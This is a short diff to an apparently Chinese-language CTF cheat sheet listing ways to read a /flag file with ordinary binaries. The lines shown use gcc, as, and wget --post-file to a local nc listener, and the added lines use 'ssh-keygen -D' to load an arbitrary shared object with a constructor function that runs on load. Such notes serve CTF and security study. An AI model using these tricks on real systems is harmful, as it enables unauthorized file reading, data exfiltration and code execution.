@@ -169,4 +169,10 @@ gcc： 编译器 gcc -x c -E /flag
 as： 汇编语言编译器 as /flag
 wget： 网络获取内容 nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888
 
+ssh-keygen: 生成ssh key的命令，可以通过 ssh-keygen -D 来加载任意so
+加载so时，可以通过下面的函数
+void __attribute__((constructor)) func(){
+    printf("test\n");
+}
+让函数在so加载时(未执行main函数)被执行
 ```
